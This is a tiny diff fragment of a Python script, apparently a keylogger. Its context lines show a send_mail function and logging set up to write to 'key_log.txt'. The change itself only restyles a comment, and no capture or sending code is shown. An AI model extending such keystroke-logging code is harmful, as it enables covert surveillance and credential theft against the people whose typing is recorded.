@@ -48,7 +48,7 @@ def send_mail():
 # if no name it gets put into an empty string
 log_dir = " "
 
-# this is the basic logging function
+########## this is the basic logging function###########
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format ='%(asctime)s: %(message)s:')
 # library
 
